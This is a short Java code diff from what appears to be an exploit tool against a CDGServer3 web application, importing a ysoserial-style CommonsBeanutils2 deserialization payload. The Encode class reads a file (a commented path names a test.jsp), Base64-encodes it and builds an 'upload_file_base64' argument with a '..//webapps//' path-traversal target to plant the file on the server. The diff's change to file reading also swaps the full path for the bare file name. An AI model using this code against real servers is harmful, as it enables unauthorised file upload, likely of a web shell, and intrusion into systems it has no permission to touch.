@@ -3,25 +3,20 @@ package com.cdg;
 import com.cdg.yso.payloads.CommonsBeanutils2;
 
 import java.io.*;
+import java.nio.file.Files;
+import java.nio.file.Paths;
 import java.util.Base64;
 
 public class Encode {
     public static String encoder(String filePath) {
         try {
             //String filePath = "/Users/admin/Downloads/CDGDEcodeXML-main/out/artifacts
-            // /CDGDEcodeXML_jar/test.jsp";
             File file = new File(filePath);
             String fileName = file.getName();
-            BufferedReader br = new BufferedReader(new FileReader(file));
-            String st;
-            String Content = "";
-            while ((st = br.readLine()) != null){
-                if(!Content.equals("")){
-                    Content = Content +"\n";
-                }
-                Content = Content + st;
-            }
-            String encodedString = Base64.getEncoder().withoutPadding().encodeToString(Content.getBytes());
+
+            String fileContent = new String(Files.readAllBytes(Paths.get(fileName)));
+            String encodedString =
+                    Base64.getEncoder().withoutPadding().encodeToString(fileContent.getBytes());
 
             String[] args = {"upload_file_base64:..//webapps//CDGServer3//"+ fileName + "|" + encodedString};
 
